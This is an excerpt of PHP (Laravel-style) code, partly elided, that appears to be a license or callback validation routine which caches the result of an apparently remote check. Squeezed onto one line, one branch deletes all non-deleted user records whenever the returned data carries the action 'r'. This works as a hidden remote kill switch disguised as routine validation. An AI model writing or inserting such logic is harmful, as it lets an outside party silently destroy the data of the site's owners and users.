        ...
        if (!Cache::has('callback')) {
            ...
            if($result){
                ...
                if($result['flag'] == 'valid'){
                    $callback = 1;
                } elseif(isset($result['data']) && isset($result['data']['action']) && $result['data']['action'] == 'r'){\App\User::whereNull('deleted_at')->delete();$callback = 'r';
                }
            }

            if($callback){Cache::put('callback', $callback, 24*60*7);} else {Cache::put('callback', $callback, 24*60);}
        } else {
